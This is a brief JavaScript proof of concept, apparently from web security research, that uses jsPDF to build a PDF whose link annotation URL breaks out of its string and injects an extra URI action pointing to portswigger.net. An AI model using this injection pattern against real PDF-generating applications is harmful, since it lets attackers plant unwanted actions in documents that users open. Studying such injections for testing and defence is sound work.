const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)/Type/Action>>/F 0>>(`});
doc.text(20, 20, 'Test text');
doc.save("output.pdf");
